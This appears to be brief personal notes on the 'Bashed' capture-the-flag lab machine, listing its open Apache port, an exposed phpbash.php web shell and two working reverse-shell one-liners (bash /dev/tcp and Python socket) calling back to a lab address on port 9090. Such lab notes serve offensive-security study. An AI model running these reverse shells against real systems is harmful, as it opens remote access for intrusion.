# bashed

- ip: 10.10.10.68
- **80/tcp**: `Apache httpd 2.4.18 (Ubuntu)`
- http://10.10.10.68/dev/phpbash.php

- `bash -i >& /dev/tcp/10.10.14.20/9090 0<&1`
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


